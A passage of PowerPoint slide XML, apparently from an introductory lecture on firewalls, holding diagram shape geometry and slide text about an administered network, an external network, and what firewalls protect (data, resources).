                <a:lnTo>
                  <a:pt x="732" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="742" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="753" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="763" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="773" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="782" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="791" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="801" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="809" y="718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="816" y="718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="824" y="718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="839" y="717"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="852" y="715"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="865" y="713"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="876" y="712"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="888" y="710"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="900" y="707"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="910" y="705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="931" y="700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="943" y="697"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="953" y="693"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="965" y="691"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="977" y="687"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="990" y="683"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1002" y="679"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1015" y="676"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1029" y="672"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1056" y="665"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1070" y="662"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1083" y="657"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1096" y="652"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1109" y="647"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1120" y="641"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1132" y="635"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1142" y="627"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1152" y="620"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1160" y="610"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1165" y="606"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1168" y="601"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1174" y="590"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1180" y="579"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1184" y="567"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1188" y="554"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1191" y="541"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1194" y="527"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1195" y="513"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196" y="498"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="483"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="467"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="450"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="433"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="415"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="398"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="380"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196" y="361"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196" y="352"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196" y="343"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196" y="331"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196" y="321"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="297"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="284"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="271"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1198" y="246"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1198" y="219"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1198" y="192"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1197" y="166"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196" y="141"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196" y="128"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1195" y="116"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1194" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1191" y="93"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1190" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1188" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1186" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1183" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1180" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1176" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1173" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1169" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1165" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1160" y="13"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00ffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="714" name="Line 330"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5148000" y="4232160"/>
            <a:ext cx="490680" cy="3240"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="715" name="CustomShape 331"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4205160" y="5037120"/>
            <a:ext cx="46800" cy="227880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1500" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1500" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="716" name="CustomShape 332"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4029120" y="5249880"/>
            <a:ext cx="46800" cy="227880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1500" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1500" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="717" name="CustomShape 333"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5864400" y="4979880"/>
            <a:ext cx="1448640" cy="538920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="718" name="CustomShape 334"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6907320" y="5037120"/>
            <a:ext cx="46800" cy="227880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1500" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1500" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="719" name="CustomShape 335"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6915240" y="5249880"/>
            <a:ext cx="46800" cy="227880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1500" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1500" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="720" name="CustomShape 336"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4160880" y="5211720"/>
            <a:ext cx="608760" cy="92880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="384" h="59">
                <a:moveTo>
                  <a:pt x="4" y="26"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="335" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="339" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="339" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="339" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="335" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="26"/>
                </a:lnTo>
                <a:close/>
                <a:moveTo>
                  <a:pt x="326" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="384" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="1440">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="721" name="CustomShape 337"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2562120" y="5211720"/>
            <a:ext cx="608760" cy="92880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="384" h="59">
                <a:moveTo>
                  <a:pt x="381" y="33"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="49" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="381" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="382" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="383" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="383" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="382" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="381" y="33"/>
                </a:lnTo>
                <a:close/>
                <a:moveTo>
                  <a:pt x="59" y="59"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="59"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="1440">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="722" name="CustomShape 338"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6873840" y="5211720"/>
            <a:ext cx="608760" cy="92880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="384" h="59">
                <a:moveTo>
                  <a:pt x="4" y="26"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="335" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="336" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="336" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="335" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="26"/>
                </a:lnTo>
                <a:close/>
                <a:moveTo>
                  <a:pt x="326" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="384" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="1440">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="723" name="CustomShape 339"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5210280" y="5211720"/>
            <a:ext cx="831240" cy="92880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="671" h="59">
                <a:moveTo>
                  <a:pt x="668" y="33"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="49" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="668" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="669" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="670" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="671" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="671" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="671" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="670" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="669" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="668" y="33"/>
                </a:lnTo>
                <a:close/>
                <a:moveTo>
                  <a:pt x="58" y="59"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58" y="59"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="1440">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="724" name="CustomShape 340"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2779560" y="4960800"/>
            <a:ext cx="1681920" cy="638640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>administered</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>network</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="725" name="CustomShape 341"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5918400" y="4925880"/>
            <a:ext cx="1119600" cy="638640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>external</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>network</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What is being protected by firewalls?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Your data</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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Your resources</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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
